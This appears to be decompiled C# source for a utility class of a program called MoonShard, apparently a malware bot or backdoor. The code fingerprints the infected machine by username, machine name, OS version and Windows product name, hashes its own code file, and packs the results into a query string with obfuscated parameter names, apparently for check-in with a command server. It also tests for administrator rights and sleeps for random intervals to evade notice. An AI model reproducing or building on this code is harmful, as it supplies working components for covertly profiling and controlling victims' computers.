using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace MoonShard
{
	// Token: 0x02000007 RID: 7
	internal class UtilActions
	{
		// Token: 0x06000010 RID: 16 RVA: 0x000024B8 File Offset: 0x000006B8
		public static string BuildQuery()
		{
			string iD = UtilActions.GetID();
			string text = Uri.EscapeDataString(Environment.GetEnvironmentVariable("USERNAME"));
			string text2 = Uri.EscapeDataString(UtilActions.GetDWORD(Constants.REG_PRODUCT_PATH, "ProductName"));
			string text3 = Uri.EscapeDataString(UtilActions.GetVersion());
			return string.Format("?E19AD4B2580B={0}&EFF0BCFAA={1}&HC619F6C1A={2}&A27BF6210={3}", new object[]
			{
				iD,
				text,
				text2,
				text3
			});
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002468 File Offset: 0x00000668
		public static string GetDWORD(string path, string key)
		{
			string result;
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(path);
				if (registryKey == null)
				{
					result = "";
				}
				else
				{
					result = (string)registryKey.GetValue(key);
				}
			}
			catch (Exception)
			{
				result = "";
			}
			return result;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002406 File Offset: 0x00000606
		public static bool GetElevation()
		{
			return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
		}

		// Token: 0x06000011 RID: 17 RVA: 0x0000251C File Offset: 0x0000071C
		public static string GetID()
		{
			string s = Environment.GetEnvironmentVariable("USERNAME") + Environment.MachineName + Environment.OSVersion.ToString();
			List<byte> list = new List<byte>(Encoding.Default.GetBytes(s));
			if (list.Count < 16)
			{
				int num = 16 - list.Count;
				for (int i = 0; i < num; i++)
				{
					list.Add(0);
				}
			}
			if (list.Count > 16)
			{
				List<byte> list2 = new List<byte>();
				for (int j = 0; j < 16; j++)
				{
					list2.Add(list[j]);
				}
				list = list2;
			}
			for (int k = 0; k < 16; k++)
			{
				list[k] = (byte)((int)list[k] + k ^ Constants.MAGIC);
			}
			return new Guid(list.ToArray()).ToString().ToUpper();
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002456 File Offset: 0x00000656
		public static string GetVersion()
		{
			return UtilActions.Harp1(File.ReadAllText(Constants.CODE_BASE));
		}

		// Token: 0x0600000D RID: 13 RVA: 0x0000241C File Offset: 0x0000061C
		public static string Harp1(string input)
		{
			long num = 88271899L;
			for (int i = 0; i < input.Length; i++)
			{
				num = (num ^ (long)i ^ (long)input[i]);
			}
			return num.ToString();
		}

		// Token: 0x06000012 RID: 18 RVA: 0x000025FE File Offset: 0x000007FE
		public static void MicroSleep()
		{
			Thread.Sleep(Constants.GENERATOR.Next(1, 3) * 1000 * 60);
		}

		// Token: 0x06000013 RID: 19 RVA: 0x0000261A File Offset: 0x0000081A
		public static void RegularSleep()
		{
			Thread.Sleep(Constants.GENERATOR.Next(2, 5) * 1000 * 60);
		}
	}
}
